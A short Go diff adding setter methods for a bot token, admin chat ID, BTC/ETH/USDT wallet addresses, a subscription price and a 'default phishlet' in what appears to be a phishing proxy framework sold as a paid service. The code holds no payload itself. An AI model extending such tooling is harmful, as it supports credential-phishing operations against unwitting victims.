@@ -1148,3 +1148,11 @@ func (c *Config) SetBotConfig(token string, adminChatId int64, btc, eth, usdt st
 	c.cfg.Set(CFG_GENERAL, c.general)
 	c.cfg.WriteConfig()
 }
+
+func (c *Config) SetBotToken(v string)          { c.general.BotToken = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) SetBotAdminChatId(v int64)     { c.general.BotAdminChatId = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) SetCryptoBTC(v string)         { c.general.CryptoBTC = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) SetCryptoETH(v string)         { c.general.CryptoETH = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) SetCryptoUSDT(v string)        { c.general.CryptoUSDT = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) SetSubPrice(v int)             { c.general.SubPrice = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) SetDefaultPhishlet(v string)   { c.general.DefaultPhishlet = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
